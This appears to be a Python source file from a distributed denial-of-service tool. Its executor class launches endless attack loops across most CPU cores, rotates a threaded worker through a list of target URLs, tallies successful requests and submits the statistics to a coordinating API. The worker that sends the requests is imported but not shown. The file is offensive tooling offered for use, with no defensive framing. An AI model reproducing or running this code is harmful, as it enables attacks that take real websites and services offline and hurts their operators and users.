from multiprocessing import Pool, Manager, cpu_count

from termcolor import cprint, colored

from src.api_client import ApiClient
from src.ddos_worker import DdosWorker


class DdosPoolProcessExecutor:
    def __init__(self, urls: list[str], threads_count: int, api_instance: ApiClient):
        manager = Manager()
        self._urls = urls
        self._api_instance = api_instance
        self._threads_count = threads_count
        self._executed_results = manager.dict({url: 0 for url in urls})

    #  Starts infinite ddos process on each CPU
    def start(self):
        processes_count = cpu_count() - 1 or 1
        cprint(f'[*] Start DDOS on {processes_count} CPUs\n', 'cyan')

        with Pool(processes_count) as pool:
            try:
                pool.map(self._start_single_process, range(processes_count))
            except KeyboardInterrupt:
                cprint('\n[-] Canceled by user', 'red')
            except Exception as e:
                cprint(f'\n[-] Something failed, exiting... {e}', 'red')
            finally:
                cprint(f'\n[*] Submitting stats...', 'cyan')
                self._api_instance.submit_progress(processes_count, self._executed_results)
                cprint('[*] Successfully submitted requests stats:', 'green')
                self._print_executed_results()

    # Starts an infinite loop of executing ddos attacks alternately on each url
    def _start_single_process(self, initial_index: int):
        i = initial_index
        while True:
            try:
                url = self._urls[i % len(self._urls)]
                i += 1
                worker = DdosWorker(url)
                success_count = worker.run_concurrent(self._threads_count)

                self._executed_results[url] += success_count
                self._print_executed_results()
            except KeyboardInterrupt:
                break

    # Prints results to console
    def _print_executed_results(self):
        res = '\r[*] '
        for i, (url, count) in enumerate(self._executed_results.items()):
            res += f'{url}: {colored(count, "green")}; '
        print(res, end='')
